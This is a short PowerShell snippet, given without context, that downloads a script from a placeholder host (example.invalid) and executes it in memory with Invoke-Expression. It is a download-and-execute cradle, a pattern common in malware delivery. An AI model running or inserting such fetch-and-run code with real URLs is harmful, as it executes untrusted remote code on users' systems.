$u = 'https://example.invalid/p.ps1'
$c = (New-Object Net.WebClient).DownloadString($u)
Invoke-Expression $c
